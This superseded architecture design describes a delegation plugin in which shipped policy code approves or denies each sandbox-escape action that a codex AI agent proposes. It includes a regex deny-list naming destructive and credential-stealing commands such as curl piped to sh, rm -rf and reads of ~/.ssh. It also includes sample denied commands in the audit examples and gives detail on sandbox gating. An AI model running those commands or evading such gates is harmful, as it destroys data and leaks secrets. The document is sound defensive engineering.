> **⚠️ STATUS: SUPERSEDED BY REPOSITIONING (issue #232, 2026-07-24).** The plugin pivoted to a cross-vendor orchestrator (`sdlc-simple-orchestration`, see `2026-07-24-sdlc-simple-orchestration-design.md`); the app-server per-action-approval engine below will **not** be built as designed. Nothing here is scheduled for implementation.
>
> **What survives as recorded knowledge:** (1) the §9.17-spike-proven app-server protocol facts + posture→(sandbox, approvalPolicy) table — ground truth for any future `rpc-server` adapter kind; (2) the §3 approval-policy decision tables + destructive deny-list — a reusable per-action policy design; (3) the request-file-spool IPC choice (§2.3). **Revival condition:** per-action approval returns only as an adapter capability (`per_action_approval: true`, `kind: rpc-server`) for a backend that natively exposes a typed approval protocol, and only where not redundant with that backend's own sibling-plugin gating.

# Architecture Design: codex Mode B — persistent per-action-approval delegation via `codex app-server`

**Issue:** #232 · **Branch:** `feature/external-agent-delegation` · **Plugin:** `sdlc-agent-delegation` · **Status:** Design v1 for implementation (Fable-tier) · **Date:** 2026-07-24
**Supersedes:** main-spec §3.1 (codex `mcp-server` + FIFO persistent mode). **Builds on:** main spec (`2026-07-23-external-agent-delegation-design.md`) §9 (authoritative), §9.17 (proven app-server approval-loop spike), the shipped Mode A engine (`plugins/sdlc-agent-delegation/scripts/extdel.sh`) and helper pattern (`scripts/turn-supervisor.pl`).

---

## 1. Overview

Mode B gives a `codex-runner` Haiku subagent a **persistent codex session with per-action approval authority**: one long-lived `codex app-server` process per handle, held for the subagent's life, where every action codex proposes that would escape its sandbox surfaces as a typed JSON-RPC approval request that **our shipped policy engine** answers using the real command/cwd/patch — approve, deny, or abort — per the handle's pinned posture. It makes `workspace`-posture write-delegation safe (in-workspace writes just run; boundary escapes are policy-decided and audited) and makes `read-only` delegation auditable (every attempted escape is received, denied, logged).

**Core shape:** a new shipped helper, **`appserver-client.py`** (Python 3, **stdlib-only — no venv/pip**), is itself the detached daemon. `extdel.sh start --cli codex --mode persistent` launches it via the existing §9.1 `spawn_daemon` perl daemonizer; the client spawns `codex app-server` as its direct child (same process group), performs `initialize` → `thread/start`, then services a **filesystem request spool** under the handle directory. `extdel.sh` submits prompts by writing files and polls results from files — the same submit-then-poll + per-handle-mutex contract Mode A ships, with the same Status vocabulary plus a now-reachable `DAEMON_DEAD` and a new approvals-audit surface. The Haiku agent never touches JSON-RPC.

**Why Python for the client (vs perl):** `turn-supervisor.pl` is a signal/fork/alarm wrapper (perl's sweet spot). This client is a long-lived JSON-RPC state machine (concurrent stdout reader, per-message dispatch, nested JSON, a policy engine, atomic multi-file writes) — Python stdlib covers it and the §9.17 spike is already a proven ~130-line Python skeleton. `command -v python3` + `python3 >=3.8` join Mode B preflight.

### Schema ground truth added by this design (from the generated schema dir)

| Fact | Source |
|---|---|
| Server→client requests: `item/commandExecution/requestApproval`, `item/fileChange/requestApproval`, `item/tool/requestUserInput`, `mcpServer/elicitation/request`, `item/permissions/requestApproval` — all `id`+`method`+`params` | `ServerRequest.json` |
| `CommandExecutionRequestApprovalParams`: `threadId`, `turnId`, `itemId`, `approvalId?`, `command?` (string), `commandActions?` (parsed: `read`/`listFiles`/`search`/`unknown`, each `command`+best-effort `path`), `cwd?`, `networkApprovalContext?` (`{host, protocol}`), `proposedExecpolicyAmendment?`, `reason?`, `startedAtMs` | schema |
| v2 typed decisions: commandExecution → `accept` \| `acceptForSession` \| `{acceptWithExecpolicyAmendment}` \| `{applyNetworkPolicyAmendment}` \| `decline` (agent continues) \| `cancel` (turn interrupted); fileChange → `accept`/`acceptForSession`/`decline`/`cancel` | schema |
| v1 `ExecCommandApprovalResponse` uses `ReviewDecision`: `approved`/`approved_for_session`/`{denied:{rejection}}`/`abort`/`timed_out` — the spike sent bare `"approved"` and it was honored | schema + spike |
| **v2 `FileChangeRequestApprovalParams` does NOT carry the patch** — only `itemId`/`threadId`/`turnId`/`reason?`/`grantRoot?`. The changes live in the `fileChange` ThreadItem (`changes:[FileUpdateChange]`) delivered via `item/started` — correlate by `itemId` | schema |
| `thread/resume` params: `threadId` (required) + optional `approvalPolicy`, `sandbox`, `model`, `cwd` — posture can be re-pinned on resume | schema |
| `turn/start` requires only `{threadId, input}`; `approvalPolicy`/`sandboxPolicy` optional overrides; note `turn/start.sandboxPolicy` is a SandboxPolicy OBJECT, not the string enum `thread/start.sandbox` takes | schema |
| `turn/completed` carries `{threadId, turn:{id, status: completed\|interrupted\|failed\|inProgress, error?, items[]}}`; `turn/interrupt` and `turn/steer` exist | schema |
| `agentMessage` item: `{id, text, phase?}` — `phase` nullable; final-answer detection needs a fallback | schema |

---

## 2. Daemon & IPC architecture

### 2.1 Process model — 2 resident processes per handle

```
spawn_daemon (perl, §9.1 — unchanged)
  └── appserver-client.py          ← detached session leader; pid in daemon.pid (child writes own pid)
        └── codex app-server        ← Popen child, SAME process group (Popen WITHOUT start_new_session);
             pid in appserver.pid;   one `kill -TERM -$(cat daemon.pid)` reaches BOTH.
```

No FIFO, no holder process, no separate watchdog process (the client owns the app-server pipes directly — single writer/reader, so §9.8/§9.9 FIFO hazards are structurally gone; the client is its own idle watchdog). Fan-out note becomes "cap 5 handles ⇒ ≤ 10 resident processes".

### 2.2 File layout — `./tmp/agent-delegation/<HANDLE>/`

`HANDLE = codex-persistent-<UTC ts>-<rand6>` (fits `validate_handle` unchanged).

```
meta.json            # Mode A fields + mode:"persistent", thread_id, idle_timeout_s, hard_cap_grace_s, appserver_version
session.id           # the app-server threadId (same convention as Mode A session id)
daemon.pid           # appserver-client.py pid (written by spawn_daemon's child leg)
appserver.pid        # codex app-server pid (written by client after Popen)
daemon.ready         # {"threadId","appserverPid","userAgent","ts"} on successful init+thread/start
daemon.error         # written INSTEAD of daemon.ready on handshake failure {"stage","message"}
daemon.exit          # on ANY client exit {"reason":"stopped|idle-timeout|appserver-died|crash","detail","ts"}
daemon.log           # client diagnostics
appserver.stderr.log # codex app-server stderr, verbatim
activity.touch       # touched on request pickup + every notification
.turn-lock/          # SAME per-handle mutex as Mode A (§9.8); owner.pid = daemon pid mid-turn
turn-00N.prompt.txt        # written by extdel.sh under the lock
turn-00N.request.json      # work order, atomically mv'd into place (submit signal)
turn-00N.request.taken     # renamed by client on pickup (atomic claim)
turn-00N.started           # epoch at submit
turn-00N.events.jsonl      # EVERY notification + server request + our decision, one JSON line each
turn-00N.approvals.jsonl   # approval audit (subset view of events)
turn-00N.approvals.summary.json  # {approved,denied,cancelled,unknown,by_rule}
turn-00N.last-message.txt  # final agentMessage text (tmp+mv)
turn-00N.exit.code         # terminal marker (tmp+mv) — the signal cmd_status polls, as in Mode A
```

### 2.3 IPC choice: request-file spool (not FIFO, not unix socket)

- **FIFO** rejected — its whole §3.1/§9.8/§9.9 hazard surface existed only because bash fed a stdio server; the Python client removes the need.
- **Unix socket** rejected — bash 3.2 would need `nc`/python per call; macOS `sun_path` ≤ 104 bytes vs deep handle paths; adds a live-connection failure mode to a submit-then-poll design.
- **Request file + poll** chosen — same durability model `cmd_status` already trusts (`exit.code` tmp+mv), works from any process that knows the handle string, trivially testable; ≤500 ms pickup latency is irrelevant vs multi-second turns.

Request shape (`turn-00N.request.json`, tmp + `mv`): `{"turn":2,"prompt_file":"turn-002.prompt.txt","timeout_s":600}` — **no posture field** (client reads pinned posture from `meta.json` once at startup; extdel.sh also refuses non-pinned `--posture` before writing the request). A confused/compromised Haiku wrapper cannot smuggle an escalation through the spool.

### 2.4 Pseudo-flow

**`extdel.sh start --cli codex --mode persistent --posture P …`**
```
1 reap_stale_locks_quiet; preflight_codex (command -v codex; codex login status);
  command -v python3 && python3 >=3.8 || ERROR
2 handle; mkdir; write meta.json (mode=persistent, posture pinned)
3 acquire_turn_lock (fresh handle); write turn-001.prompt.txt
4 spawn_daemon "$DIR/daemon.pid" "python3 $SCRIPT_DIR/appserver-client.py --handle-dir $DIR" "$DIR/daemon.log"
5 wait ≤20s for daemon.ready OR daemon.error:
    error/timeout → kill -TERM -$(cat daemon.pid); Status: ERROR (daemon.error + daemon.log + appserver.stderr tails)
6 session.id now holds threadId → meta.thread_id
7 write turn-001.started; atomically mv turn-001.request.json into place
8 meta.turn_count=1; emit RUNNING (Held process: yes; Session id: <threadId>)
```

**`appserver-client.py` main loop** (single-threaded dispatch + one stdout-reader thread → `queue.Queue`; stdin writes only from the main loop):
```
boot: Popen(["codex","app-server"], cwd=meta.cwd) → appserver.pid
      initialize {clientInfo, capabilities:{}}
      thread/start {cwd, approvalPolicy:POSTURE[P].approval, sandbox:POSTURE[P].sandbox}
        (or thread/resume {threadId, approvalPolicy, sandbox} when --resume-thread — §5.2)
      write session.id (threadId), daemon.ready     # any failure → daemon.error + exit
idle loop (tick 500ms):
      if turn-*.request.json present:
          rename → .request.taken (atomic claim); claim .turn-lock/owner.pid ← own pid (tmp+rename)
          touch activity.touch; run TURN
      elif idle > idle_timeout_s since last turn end → graceful shutdown(reason=idle-timeout)
TURN (deadline_soft=started+timeout_s, deadline_hard=+hard_cap_grace_s):
      send turn/start {threadId, input:[{type:"text",text:<prompt>}]}
      loop on inbox (1s poll):
          notification → append events.jsonl; touch activity
            item/started(fileChange) → cache item.id → changes (approval correlation)
            item/completed(agentMessage, phase=="final_answer" or null) → candidate answer
            turn/completed → capture turn.status/turn.error; finalize
          server request → POLICY(method,params,posture) → decision (§3); reply on stdin;
                           append decision to events.jsonl + approvals.jsonl
          appserver EOF/exit → finalize(status=appserver-died)
          now>deadline_hard → turn/interrupt; wait ≤10s for turn/completed; finalize(timeout)
finalize:
      last-message.txt ← final-answer candidate (prefer phase=="final_answer"; else last agentMessage; else empty)
      approvals.summary.json ← counters
      exit.code ← 0 (completed) | 1 (failed/policy-cancelled) | 124 (hard-cap) | 125 (appserver died)  [tmp+mv]
      release .turn-lock iff owner.pid==own pid; return to idle loop (daemon stays alive)
```

**`extdel.sh prompt <HANDLE>`** — same head as Mode A (validate handle, scope check now admits `codex/persistent`, pinned-posture check, session-id present, acquire lock BEFORE writing prompt) then: `kill -0 $(cat daemon.pid)` else DAEMON_DEAD; write prompt+started; mv request.json in; meta.turn_count=N; emit RUNNING.

**`extdel.sh status <HANDLE> [--wait-s N]`** — Mode A bounded poll with branches: `exit.code` present → terminal; daemon dead + no exit.code → DAEMON_DEAD (repollable:no, daemon.exit + appserver.stderr tails); request unclaimed >30s while daemon alive → ERROR "daemon unresponsive"; no exit.code + elapsed>timeout_s → TIMEOUT **repollable:YES** (hard cap bounds it). Terminal map: 0→SUCCESS→(DF2 blank → NO_OUTPUT, hint enriched "all N proposed actions denied" when denied>0); 1→FAILURE (turn.error tail / policy-cancel); 124→TIMEOUT repollable:no; 125→FAILURE "app-server died" + stderr tail, later prompts DAEMON_DEAD.

Lock division: extdel.sh acquires + writes owner.pid=own transient pid; the client overwrites owner.pid=own pid on pickup and releases at exit.code — mirrors turn-supervisor.pl. `lock_is_stale()` unchanged.

---

## 3. The approval policy (the heart of Mode B)

Pure function in `appserver-client.py`: `decide(method, params, posture, workspace_roots) → (decision, rule_id)` — shipped code, never Haiku-composed, never prompt/request-configurable. `workspace_roots = {meta.cwd} ∪ meta.add_dirs ∪ {meta.cwd}/tmp`. Posture read from `meta.json` once at start; no code path evaluates any other posture (§9.10 mechanically).

### 3.1 Posture → (sandbox, approvalPolicy)

| posture | sandbox | approvalPolicy | rationale |
|---|---|---|---|
| `read-only` | `read-only` | `untrusted` | Runs the loop deliberately: (1) codex server-side REJECTS escalations under `untrusted` even if the client approves (§9.17-verified) — a policy bug still can't open a write path; (2) every escape attempt is received, denied, audited. `never` rejected (loses audit + can't approve untrusted-but-in-sandbox reads); `on-request` rejected for read-only (weaker than untrusted's server-side hard block). |
| `workspace` | `workspace-write` | `on-request` | In-workspace writes land with no friction; approval fires exactly at the sandbox boundary. |
| `dangerous` | `danger-full-access` | `never` | Explicit full trust; no gating; still streams + audits. |

### 3.2 Decision tables (v2 typed enums `accept`/`decline`/`cancel`)

⚠ **Probe P1:** spike honored v1 `approved`; v2 schema says `accept`. Keep BOTH spellings in one translation table; probe one cheap live turn and pin. Never send `acceptForSession`/`acceptWithExecpolicyAmendment`/`applyNetworkPolicyAmendment` (silently widen future behavior; would make the audit lie).

**`item/commandExecution/requestApproval`** (top-down, first match wins):

| posture | condition | decision | rule id |
|---|---|---|---|
| any | command matches destructive deny-list (§3.3) | decline | deny.destructive.<n> |
| read-only | `networkApprovalContext` present | decline | deny.ro.network |
| read-only | every `commandActions` type ∈ {read,listFiles,search} AND every path NOT in sensitive list (§3.3b) | accept (runs inside read-only sandbox; codex still hard-blocks true escalation) | allow.ro.read-cmd |
| read-only | anything else | decline | deny.ro.default |
| workspace | `networkApprovalContext` present | decline | deny.ws.network |
| workspace | all read-type but path outside granted roots | decline (exfil surface) | deny.ws.outside-read |
| workspace | any write/unknown action with resolved path outside `workspace_roots` | decline | deny.ws.outside-write |
| workspace | anything else (unclassifiable escalation) | decline | deny.ws.default |
| dangerous | any (shouldn't occur under `never`) | accept (pinned full trust; audited) | allow.dg.pinned |

Punchline: **workspace default = deny-all-escalations.** Value over Mode A `-s workspace-write` isn't "approve more" — it's (a) in-workspace work with a live resumable session, (b) every boundary attempt captured verbatim + surfaced (Mode A escalations silently fail), (c) single place a future deliberate allowance (`--allow-network-host <h>`) plugs in.

**`item/fileChange/requestApproval`** (v2 params carry NO patch; correlate `params.itemId` against cached `item/started` fileChange `changes`):

| posture | condition | decision | rule id |
|---|---|---|---|
| read-only | always | decline | deny.ro.filechange |
| workspace | correlated changes found AND every path under `workspace_roots` AND none match §3.3b | accept | allow.ws.inside-patch |
| workspace | any path outside roots, OR no correlated item (blind) | decline | deny.ws.patch / deny.ws.patch-blind |
| dangerous | always | accept | allow.dg.pinned |

**`item/permissions/requestApproval`** — profile widening = escalation. read-only/workspace → refuse via JSON-RPC error `{"code":-32600,"message":"denied by extdel posture policy"}`, audit `deny.permissions`. ⚠ **Probe P2:** if error aborts the turn ungracefully, switch to empty/minimal grant.

**`item/tool/requestUserInput`** — no user. Reply `{"answers":[]}`, audit `deny.userinput-empty`. ⚠ **Probe P3.**

**`mcpServer/elicitation/request`** — reply `{"action":"decline"}`, audit `deny.elicitation`.

**Unknown server-request method** — reply JSON-RPC error `{"code":-32601,...}`, audit `deny.unknown-method`, bump `unknown`. Never reply `{}` to an approval-shaped request. **Deny-by-default invariant: a request we cannot classify is refused.**

**Denial-loop breaker:** >10 policy denials in one turn → answer the 11th with `cancel`, finalize exit.code 1, FAILURE "turn cancelled by policy after 11 denied escalation attempts". Bounds ask-deny token burn.

### 3.3 Destructive deny-list (workspace belt-and-braces)

Honest scoping (stated in policy skill + audit header): **the deny-list only sees boundary-crossing commands.** An in-workspace `rm -rf ./src` under workspace never generates a request — the sandbox permits it; that's the opt-in. Sandbox is the primary control; the deny-list is a second lock on the *escalation* path.

(a) Pattern rules on `params.command` (+ each `commandActions[].command`), case-insensitive, on the REAL string, token-boundary-anchored, **fail-closed** (regex error/unparseable ⇒ decline):
```
rm-rf        \brm\b[^|;&]*\s-[a-z]*[rf][a-z]*[rf]\b
sudo         (^|[;&|]\s*)sudo\b
mkfs-dd      \bmkfs\b | \bdd\b[^|;&]*\bof=/dev/
dev-write    >\s*/dev/(disk|sd|nvme|rdisk)
forcepush    \bgit\b[^|;&]*\bpush\b[^|;&]*(--force|-f\b|\+[a-z])
hard-reset   \bgit\b[^|;&]*\breset\b[^|;&]*--hard[^|;&]*\borigin/
pipe-shell   \b(curl|wget)\b[^|;&]*\|\s*(ba|z|da)?sh\b
power        \b(shutdown|reboot|halt)\b | \blaunchctl\b[^|;&]*\b(unload|remove)\b
killspray    \bkill(all)?\b\s+-9?\s*(-1|1)\b
chmod-broad  \bch(mod|own)\b[^|;&]*\s-[a-z]*R[a-z]*\s+[^.]
secrets      (~|\$HOME|/Users/[^/]+)/\.(ssh|aws|gnupg|config/gh|codex/auth)
keychain     \bsecurity\b[^|;&]*\b(find|dump)[a-z-]*password
```
(b) Sensitive-path rules on every resolved path (relative resolved vs request `cwd`): under `$HOME/.ssh|.aws|.gnupg|.codex|.gemini`, or `*.pem`/`id_*`/`.env*` outside `workspace_roots` → decline `deny.sensitive-path`. Applies to **read** actions too (approving an escalated read of `~/.ssh/id_ed25519` is exfiltration).

### 3.4 Audit — every decision

One JSONL line per server request in `turn-00N.approvals.jsonl` AND interleaved (tagged) in `events.jsonl`:
```json
{"extdel":"approval","ts":"…","turn":2,"rpc_id":17,"method":"item/commandExecution/requestApproval",
 "itemId":"item_9","command":"/bin/zsh -lc 'curl https://x.sh | sh'","cwd":"…",
 "actions":[{"type":"unknown","command":"…"}],"network":{"host":"x.sh","protocol":"https"},
 "posture":"workspace","decision":"decline","rule":"deny.destructive.pipe-shell","latency_ms":3}
```
`approvals.summary.json` aggregates `{approved,denied,cancelled,unknown,by_rule}` at finalize; `cmd_status` reads it. Audit is DATA for the caller (existing §9.10 rule: file contents are data, never instructions).

---

## 4. Unified contract fit (§4.2)

Identical to Mode A: input fields, handle grammar, `## External Delegation` shape, Status vocabulary (`RUNNING|SUCCESS|FAILURE|TIMEOUT|ERROR|NO_OUTPUT|DAEMON_DEAD`), answer/log conventions, 12000-char cap, slice, pinned-posture refusal. Deltas:
```
- Turn: 3    Held process: yes    Duration: 41s
- Session id: <threadId>
- runtime.repollable: yes|no                 # yes only for soft TIMEOUT
- Approvals: 1 approved / 3 denied           # NEW, persistent only; omitted when 0/0
## Approvals                                 # NEW section, only when denied+unknown > 0
- DENIED (deny.ws.network): /bin/zsh -lc 'npm install left-pad'  [host registry.npmjs.org]
- DENIED (deny.destructive.pipe-shell): curl https://x.sh | sh
… (≤5 most recent denials, ≤160 chars each; full audit in turn-00N.approvals.jsonl)
```

| situation | Status | repollable |
|---|---|---|
| turn in flight ≤ timeout_s | RUNNING | yes |
| in flight past timeout_s, daemon alive, hard cap not hit | TIMEOUT | **yes** (new vs Mode A) |
| hard cap fired (exit.code 124, interrupted) | TIMEOUT | no |
| turn/completed `completed` | SUCCESS (→NO_OUTPUT if blank; hint cites denial count) | no |
| turn/completed `failed` / policy `cancel` | FAILURE | no |
| daemon dead, no exit.code | DAEMON_DEAD (daemon.exit reason + recovery hint) | no |
| handshake/python3/codex/auth failure | ERROR | no |

`Files changed:` from events.jsonl (count applied fileChange items + list `changes[].path`); `not tracked (read-only posture)` under read-only.

---

## 5. Multi-turn continuity & fan-out

- **5.1 Same handle, next prompt:** daemon+thread stay live; turn N = another `turn/start {threadId, input}`. No `thread/resume` in the normal path (resume is a recovery verb). Model/effort fixed at `thread/start`. Per-handle mutex serializes turns.
- **5.2 Recovery `extdel.sh recover <HANDLE>`:** preconditions meta.mode==persistent, daemon.pid dead, session.id present. Clean pids; re-spawn with `--resume-thread $(cat session.id)`; client calls `thread/resume {threadId, approvalPolicy, sandbox}` **re-passing the pinned posture** (so a resumed thread can't come back laxer). Success → daemon.ready rewritten, numbering continues. Failure → ERROR + start fresh handle. ⚠ **P4:** resume re-pin honored. ⚠ **P5 (optional):** `codex exec resume <threadId>` fallback (both persist under ~/.codex/sessions).
- **5.3 Escalation on a live handle:** `--steal` REFUSED in Mode B v1 (`ERROR: persistent handles cannot change posture; start a new handle`) — posture is baked at thread/start; escalation-requires-new-handle is the stronger §9.10 reading. Future v1.1: `start --resume-thread <id> --posture workspace` (new handle, still pinned+visible). Flagged, not built.
- **5.4 Fan-out:** N subagents → N handles → N (client+app-server) pairs + N threads; zero shared mutable state. Cap 5 (≤10 resident processes). Untouched: agy path, Mode A codex path.

---

## 6. Lifecycle, failure modes & reaping

**6.1 stop (Mode B branch):** `kill -TERM -$(cat daemon.pid)` (group: client+app-server); wait ≤8s for daemon.exit + pids dead (client SIGTERM handler: in-flight turn → turn/interrupt ≤2s → exit.code 130 FAILURE "stopped by caller" → terminate app-server TERM→5s→KILL → daemon.exit{stopped} → release lock → exit); still alive → KILL pgid + KILL appserver.pid individually; rm pids + .turn-lock; meta.closed; logs retained. Wrapper's final-turn stop stays mandatory.

**6.2 Three-layer reaping (reshaped §5.3):** (1) wrapper final-turn stop; (2) **client self-watchdog** (tracks last-activity, after idle_timeout_s=1800 gracefully shuts down — is the daemon, can't be skipped separately; blind spot = hung client → layer 3); (3) sweep on entry (`cmd_reap` + `reap_stale_locks_quiet` at every start): daemon.pid dead → clean pids, kill appserver.pid iff `ps -o command=` matches `codex app-server`, mark closed if daemon.exit present; daemon alive but activity.touch older than 2×idle_timeout or meta closed → kill pgid, clean. Stale `.turn-lock` via `lock_is_stale` untouched.

**6.3 Failure matrix (key rows):** codex/python3 missing → ERROR; auth → ERROR "run 'codex login'"; handshake timeout(20s) → ERROR + tails, group killed; app-server dies mid-turn → exit.code 125 FAILURE + stderr tail, daemon exits, later prompts DAEMON_DEAD, recover; app-server dies idle → daemon.exit, next prompt DAEMON_DEAD; client crash → top-level except writes daemon.exit{crash}+traceback tail, terminate app-server, exit.code 125; client SIGKILL → DAEMON_DEAD, layer-3 reap kills orphan via appserver.pid+cmdline; turn>timeout_s → TIMEOUT repollable:yes; turn>hard cap → turn/interrupt, exit.code 124, TIMEOUT repollable:no; unknown approval method → JSON-RPC error, audit deny.unknown-method; denial loop >10 → cancel; request never claimed >30s → ERROR "daemon unresponsive"; thread not resumable → ERROR + new handle; harness pgkill (future) → DAEMON_DEAD (§9.12 m9 wording).

**6.4 Client robustness:** all stdin writes try/except (BrokenPipe ⇒ appserver-died); all state files tmp+`os.replace` (atomic POSIX); events.jsonl append+flush-per-line; reader thread sole stdout consumer; unparseable stdout logged+dropped (never crash on garbage); ids/startedAtMs audited but never trusted for control flow; owner.pid claim/release copies turn-supervisor.pl discipline verbatim.

---

## 7. Scope boundaries

1. **codex Mode B = app-server. §3.1 mcp-server+FIFO is superseded, will not be built.** Survives: ./tmp handle layout + activity.touch idle model; `spawn_daemon` (§9.1) as sole detachment; submit-then-poll (§9.2); per-handle mutex + pinned posture (§9.8/§9.10); 3-layer reaping (§5.3, reshaped §6.2). Dies: FIFO+holder trick, tools/list discovery (R1 moot), byte-offset/jq scanning (§9.4), daemon `approval_policy=never` (§9.5 — inverted: receiving approvals is the point), FIFO alarm-guards (§9.9 — perl-alarm remains Mode A's timeout, untouched), PIPE_BUF (R5 moot).
2. **agy Mode B out of scope** — agentapi has no approve/deny verb (§9.15/§9.16); structurally impossible today. `extdel.sh` keeps refusing `agy persistent` cleanly.
3. **Mode A untouched** except: scope check admits `codex`+`persistent`; Mode B branches in status/stop/reap; `Held process:` becomes a variable (Mode A keeps `no`).

---

## 8. Testability — mock app-server (no codex tokens)

**8.1 Mock** `tests/fixtures/mock-appserver.py`, driven via the mock `codex`'s `app-server` branch: scripted line-JSON-RPC on stdio. Baseline: initialize→{userAgent}; thread/start→{thread:{id}}; thread/resume→echo+record; turn/start→ack then (50ms apart) turn/started→item/started(agentMessage)→item/completed(agentMessage,final_answer,text)→turn/completed{completed}; turn/interrupt→turn/completed{interrupted}; any client reply recorded. Knobs: `MOCK_APPSERVER_SCRIPT=<jsonl>` (full scenario incl `{"expect_decision":…}`), `MOCK_APPSERVER_APPROVAL='cmd:…|patch:…|network:…'` (injects one approval mid-turn, blocks until reply, then proceeds/denied-answer), `MOCK_APPSERVER_DECISIONS=<file>` (records every reply), `MOCK_APPSERVER_INIT_FAIL=auth`, `MOCK_APPSERVER_DIE_AFTER=<n>`, `MOCK_APPSERVER_HANG=1`, `MOCK_APPSERVER_RESUME_LOG=<file>`.

**8.2 Policy unit surface** `python3 appserver-client.py --policy-check --posture workspace < request.json` → `{"decision":"decline","rule":"deny.destructive.pipe-shell"}` — pure-function table tests, one fixture JSON per §3.2/§3.3 row (incl every deny pattern, sensitive-path, blind-fileChange refusal, unknown-method default).

**8.3 `tests/test-extdel-codex-persistent.sh`:** (1) start→RUNNING→SUCCESS, daemon.ready, session.id==thread id, Held process:yes; (2) multi-turn on one threadId, lock held/released; (3) approval per posture → decisions assert decline/decline/accept (ro/ws/dg) with rule ids + return block Approvals section; (4) NO_OUTPUT-with-denial-hint; (5) death mid-turn → FAILURE(125) → DAEMON_DEAD → recover shows thread/resume with re-pinned posture; (6) timeouts: HANG → TIMEOUT repollable:yes past timeout_s; hard cap (`EXTDEL_HARD_CAP_GRACE_S=3`) → exit.code 124 repollable:no + turn/interrupt recorded; (7) stop kills both pids ≤8s, daemon.exit{stopped}, meta closed; reap cleans orphaned mock app-server via cmdline; (8) denial loop → 11th `cancel`, FAILURE.

---

## 9. Ranked open risks + probes

1. **R-B1 decision dialect** (v1 `approved` vs v2 `accept`): translation table + Probe P1 (one cheap turn) before ship; mocks lock the choice.
2. **R-B2 app-server experimental / protocol drift:** meta.appserver_version recorded; deny-by-default on unknown (fail safe); schema regen is token-free; all protocol knowledge in one file.
3. **R-B3 final-answer detection when phase null:** prefer final_answer; fallback last agentMessage; full events always available; probe with P1.
4. **R-B4 untrusted read-request frequency:** accept-if-parsed-read handles common case; unknown-parsed reads declined may degrade answers (surfaced via NO_OUTPUT+hints); fix is policy-table-local. Watch in dogfood.
5. **R-B5 orphaned app-server after client SIGKILL:** bounded by layer-3 reap (pid+cmdline+age); orphan with dead pipe SIGPIPE-exits on next write. Low.
6. **R-B6 repollable-TIMEOUT ergonomics:** two meanings for one word; distinct Errors wording + wrapper-agent decision table.
7. **R-B7 P2/P3 response shapes** (permissions/userInput/elicitation): deny paths schema-plausible, unverified; worst case FAILURE (safe direction). Cheap probes.
8. **R-B8 thread/resume re-pin (P4) + exec-resume fallback (P5):** recovery degrades to "new handle" if resume misbehaves — annoying not unsafe (resume re-sends pinned posture; failure is loud).
9. **R-B9 python3 variance:** stdlib-only; preflight `python3 >=3.8` or ERROR.
10. **R-B10 cost opacity:** `thread/tokenUsage/updated` captured in events.jsonl for future cost-telemetry.

**Implementation order:** ① `appserver-client.py` core loop + `--policy-check` + policy tables (mock-tested, zero tokens) → ② `extdel.sh` Mode B branches (start/prompt/status/stop/reap/recover) against the mock → ③ live probes P1–P4 (one short real turn each; workspace probe writes only into a scratch cwd) → ④ `codex-runner.md` + policy-skill updates → ⑤ release + retrospective. Every stage drivable by `bash extdel.sh …` before any Haiku agent touches it.
